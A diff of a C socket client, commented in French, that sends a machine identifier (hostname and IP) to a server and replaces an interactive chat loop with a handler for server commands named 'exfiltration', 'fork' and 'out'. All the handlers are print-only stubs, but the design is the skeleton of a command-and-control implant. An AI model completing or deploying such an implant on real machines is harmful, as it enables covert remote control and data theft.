@@ -38,14 +38,59 @@ void get_machine_identifier(char *identifier, size_t size)
     snprintf(identifier, size, "%s-%s", hostname, ip_address);
 }
 
+// Fonction pour gérer les commandes reçues du serveur
+void handle_client_commands(int server_fd)
+{
+    char buffer[BUFSIZ];
+    int bytes_read;
+
+    while (1)
+    {
+        // Recevoir une commande du serveur
+        bytes_read = recv(server_fd, buffer, BUFSIZ - 1, 0);
+        if (bytes_read <= 0)
+        {
+            if (bytes_read == 0)
+                printf("Server disconnected.\n");
+            else
+                perror("recv");
+            break;
+        }
+
+        buffer[bytes_read] = '\0'; // Terminer la chaîne reçue
+        printf("Command received from server: \"%s\"\n", buffer);
+
+        // Gestion des commandes spécifiques
+        if (strcmp(buffer, "exfiltration") == 0)
+        {
+            printf("Executing exfiltration...\n");
+        }
+        else if (strcmp(buffer, "fork") == 0)
+        {
+            printf("Executing fork...\n");
+        }
+        else if (strcmp(buffer, "out") == 0)
+        {
+            printf("Executing out...\n");
+        }
+        else if (strcmp(buffer, "quit") == 0)
+        {
+            printf("Server requested disconnection.\n");
+            break;
+        }
+        else
+        {
+            printf("Unknown command: \"%s\"\n", buffer);
+        }
+    }
+}
+
 int main(int argc, char **argv)
 {
     struct sockaddr_in sa;
     int socket_fd;
     int status;
-    char buffer[BUFSIZ];
-    char msg[BUFSIZ];
-    int bytes_sent, bytes_read;
+    char identifier[BUFSIZ];
 
     // Préparation de l'adresse et du port
     memset(&sa, 0, sizeof sa);
@@ -69,55 +114,18 @@ int main(int argc, char **argv)
     }
 
     // Envoi de l'identifiant de la machine
-    char identifier[BUFSIZ];
     get_machine_identifier(identifier, sizeof(identifier));
     printf("Sending machine identifier: %s\n", identifier);
 
-    bytes_sent = send(socket_fd, identifier, strlen(identifier), 0);
-    if (bytes_sent == -1)
+    if (send(socket_fd, identifier, strlen(identifier), 0) == -1)
     {
         perror("send");
         close(socket_fd);
         return 3;
     }
 
-    // Communication avec le serveur
-    while (1)
-    {
-        printf("Enter a message (type 'quit' to exit): ");
-        fgets(msg, BUFSIZ, stdin);
-        msg[strcspn(msg, "\n")] = '\0';
-
-        if (strcmp(msg, "quit") == 0)
-        {
-            printf("Disconnecting...\n");
-            break;
-        }
-
-        bytes_sent = send(socket_fd, msg, strlen(msg), 0);
-        if (bytes_sent == -1)
-        {
-            perror("send");
-            break;
-        }
-
-        bytes_read = recv(socket_fd, buffer, BUFSIZ - 1, 0);
-        if (bytes_read == 0)
-        {
-            printf("Server disconnected.\n");
-            break;
-        }
-        else if (bytes_read == -1)
-        {
-            perror("recv");
-            break;
-        }
-        else
-        {
-            buffer[bytes_read] = '\0';
-            printf("Server response: \"%s\"\n", buffer);
-        }
-    }
+    // Gestion des commandes du serveur
+    handle_client_commands(socket_fd);
 
     close(socket_fd);
     return 0;
